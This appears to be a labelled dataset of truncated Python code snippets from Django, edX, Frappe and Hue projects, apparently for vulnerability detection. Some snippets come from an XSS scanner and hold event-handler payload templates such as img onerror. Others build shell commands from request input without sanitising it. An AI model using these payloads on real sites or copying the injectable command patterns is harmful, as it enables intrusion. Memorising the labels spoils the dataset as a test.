url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$", "label": 0}, {"snippet_id": 12556, "code": "/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 33898, "code": " route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append(", "label": 0}, {"snippet_id": 1, "code": " os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update", "label": 0}, {"snippet_id": 52913, "code": " for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission", "label": 0}, {"snippet_id": 51727, "code": " 'items':[ {'name': 'internet_nl_dashboard.account'}, {'name': 'internet_nl_dashboard.urllist'}, {'name': 'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app", "label": 1}, {"snippet_id": 30572, "code": "'$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path", "label": 0}, {"snippet_id": 28934, "code": ".close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff", "label": 0}, {"snippet_id": 33256, "code": "\"\"Cancels a swarming task.\"\"\" @decorators.require_taskqueue('backend-default') def post(self, host, task_id): swarming.cancel_task(host, task_id) class UnregisterBuilders(webapp2.RequestHandler): \"\"\"Unregisters", "label": 0}, {"snippet_id": 50943, "code": ".contrib.humanize.templatetags.humanize import naturaltime from django.utils.safestring import mark_safe from django_celery_beat.admin import PeriodicTaskAdmin, PeriodicTaskForm from django_celery_beat", "label": 0}, {"snippet_id": 38568, "code": "\t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes", "label": 0}, {"snippet_id": 51179, "code": ".site.register(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources", "label": 0}, {"snippet_id": 50025, "code": " _SERVERNAME=settings.SERVERNAME _KEEPALIVE=30 class LazyEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, Promise): return force_unicode(obj) return super(LazyEncoder, self).default(obj)", "label": 0}, {"snippet_id": 3047, "code": ".db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads", "label": 0}, {"snippet_id": 3947, "code": " decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via", "label": 0}, {"snippet_id": 46597, "code": "('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.copy_collections([collection['id'] for collection", "label": 0}, {"snippet_id": 50117, "code": " remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\",[],{}]) for csessid in to_remove: sessions=self.sessionhandler", "label": 0}, {"snippet_id": 28588, "code": " apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram[2] \t\t\t \tif proxy is", "label": 0}, {"snippet_id": 27448, "code": "-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2.Environment( loader=jinja2.FileSystemLoader( os.path.join(os.path.dirname(__file__)", "label": 0}, {"snippet_id": 40117, "code": "(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\").format(_(self.doctype), self.idx) \t\t\t\t\telse: \t\t\t\t\t\treference=\"{0}{1}\".format(_(self.doctype), self.name) \t", "label": 0}, {"snippet_id": 6651, "code": "], all usernames are allowed for /status. :return: list of usernames :rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self", "label": 0}, {"snippet_id": 12721, "code": " if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete", "label": 0}, {"snippet_id": 11804, "code": "\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 39612, "code": "\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{", "label": 0}, {"snippet_id": 20269, "code": "' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.", "label": 0}, {"snippet_id": 23215, "code": "\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 27292, "code": ".get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str", "label": 1}, {"snippet_id": 28622, "code": "\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): ", "label": 0}, {"snippet_id": 42916, "code": "')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype ", "label": 0}, {"snippet_id": 52936, "code": "'coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials", "label": 0}, {"snippet_id": 7264, "code": ".views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq", "label": 0}, {"snippet_id": 11396, "code": "{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format", "label": 0}, {"snippet_id": 45442, "code": ":editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping):", "label": 0}, {"snippet_id": 28661, "code": " user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)", "label": 0}, {"snippet_id": 49444, "code": ".model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title(self): if isinstance(self.model_field, SmartListFilter): return self.model_field", "label": 0}, {"snippet_id": 52879, "code": ": detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse", "label": 0}, {"snippet_id": 19014, "code": "('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 7247, "code": "\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 20763, "code": "', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done", "label": 0}, {"snippet_id": 44540, "code": "'workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow", "label": 0}, {"snippet_id": 38093, "code": "=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title", "label": 1}, {"snippet_id": 25877, "code": "=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget(time_format", "label": 0}, {"snippet_id": 26215, "code": ".invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts", "label": 0}, {"snippet_id": 37692, "code": "\t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment", "label": 0}, {"snippet_id": 26966, "code": " \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method,", "label": 0}, {"snippet_id": 5204, "code": " def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload", "label": 0}, {"snippet_id": 39897, "code": " docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname=", "label": 0}, {"snippet_id": 25891, "code": ".answer else None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required", "label": 0}, {"snippet_id": 6545, "code": ") for logging exceptions to Sentry. \"\"\" return self.config.get(self.section, 'raven_dsn') @property def content_packages(self): \"\"\" Get list of tuples with packages and paths to content resources, such", "label": 0}, {"snippet_id": 3815, "code": "\"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='", "label": 0}, {"snippet_id": 23167, "code": "/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 18299, "code": ")/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$", "label": 1}, {"snippet_id": 39064, "code": "\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list)", "label": 0}, {"snippet_id": 42132, "code": " int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype", "label": 0}, {"snippet_id": 16433, "code": "/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==", "label": 0}, {"snippet_id": 48400, "code": ".id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar", "label": 0}, {"snippet_id": 54961, "code": ", locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity', 'locale') .distinct() ) for changed_entity in changed_entities", "label": 0}, {"snippet_id": 32334, "code": ".relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', ", "label": 0}, {"snippet_id": 7826, "code": "'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 29884, "code": ") \t\t if form.getvalue('getcert') is not None and serv is not None: \tid=form.getvalue('getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"+cert_path+\"/\"+id] \ttry: \t\tfunct.ssh_command(serv", "label": 0}, {"snippet_id": 46633, "code": ".get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self", "label": 0}, {"snippet_id": 30112, "code": "('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }' |awk -F'/' '{ print $1 }'\"] \tfunct.ssh_command(serv, commands, ip=\"1\") \t if form.getvalue(", "label": 0}, {"snippet_id": 54644, "code": " \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm def get_success_url(self): return reverse('article-detail', kwargs={'pk'", "label": 0}, {"snippet_id": 47844, "code": "=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active", "label": 1}, {"snippet_id": 22417, "code": " 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=", "label": 0}, {"snippet_id": 31956, "code": "\tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password", "label": 0}, {"snippet_id": 33953, "code": "=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t", "label": 0}, {"snippet_id": 54780, "code": "*kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid", "label": 0}, {"snippet_id": 3821, "code": "\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +", "label": 0}, {"snippet_id": 20158, "code": "(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For", "label": 0}, {"snippet_id": 28410, "code": " var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.", "label": 0}, {"snippet_id": 2108, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['", "label": 0}, {"snippet_id": 40472, "code": "(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision", "label": 0}, {"snippet_id": 45238, "code": " new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator", "label": 0}, {"snippet_id": 744, "code": ",\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable", "label": 1}, {"snippet_id": 23834, "code": "'', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 50791, "code": ".get(\"RAW\", False)) xterm256=options.get(\"xterm256\", flags.get('XTERM256', True)) useansi=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256", "label": 0}, {"snippet_id": 47496, "code": " if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name", "label": 0}, {"snippet_id": 16956, "code": "'grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 50247, "code": " mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0", "label": 1}, {"snippet_id": 18437, "code": "/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard", "label": 0}, {"snippet_id": 12840, "code": "-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url", "label": 0}, {"snippet_id": 32731, "code": " _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;", "label": 0}, {"snippet_id": 32390, "code": " print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def _open_url(url): time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a", "label": 0}, {"snippet_id": 38927, "code": "\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self", "label": 0}, {"snippet_id": 16408, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url", "label": 0}, {"snippet_id": 23208, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading", "label": 0}, {"snippet_id": 13286, "code": "'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$", "label": 0}, {"snippet_id": 18652, "code": "+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views", "label": 0}, {"snippet_id": 12604, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 5875, "code": " t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self", "label": 1}, {"snippet_id": 3767, "code": ",value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, ", "label": 0}, {"snippet_id": 13524, "code": "+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render", "label": 0}, {"snippet_id": 30247, "code": "), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application", "label": 0}, {"snippet_id": 24476, "code": ".get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None)", "label": 0}, {"snippet_id": 7449, "code": ">[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 49963, "code": " sessions connected over the webclient. \"\"\" import json import re import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise", "label": 0}, {"snippet_id": 43644, "code": "[fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 3278, "code": ", \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record", "label": 0}, {"snippet_id": 6797, "code": " logins etc.) MongoDB connection URI(string). See MongoDB documentation for details. If not set, Kantara authn logs will not be maintained. \"\"\" return self.config.get(self.section, 'authn_info_mongo_uri'", "label": 0}, {"snippet_id": 16729, "code": "+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book", "label": 1}, {"snippet_id": 37721, "code": "\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit", "label": 0}, {"snippet_id": 8877, "code": " if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings", "label": 0}, {"snippet_id": 23405, "code": "'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 4591, "code": " 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend'", "label": 0}, {"snippet_id": 212, "code": ",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 1}, {"snippet_id": 41438, "code": "\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1", "label": 0}, {"snippet_id": 16418, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$',", "label": 0}, {"snippet_id": 24656, "code": "-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run", "label": 0}, {"snippet_id": 15257, "code": ") num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities", "label": 0}, {"snippet_id": 26196, "code": "-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings", "label": 0}, {"snippet_id": 12944, "code": ".MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops'", "label": 0}, {"snippet_id": 28446, "code": ".strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path)", "label": 0}, {"snippet_id": 41542, "code": " \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts", "label": 0}, {"snippet_id": 30600, "code": " date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') ", "label": 0}, {"snippet_id": 8951, "code": "+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to'", "label": 0}, {"snippet_id": 37861, "code": "\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn", "label": 0}, {"snippet_id": 15010, "code": "(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls):", "label": 0}, {"snippet_id": 45496, "code": ".fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get", "label": 0}, {"snippet_id": 46826, "code": " def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self", "label": 0}, {"snippet_id": 484, "code": " \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET", "label": 0}, 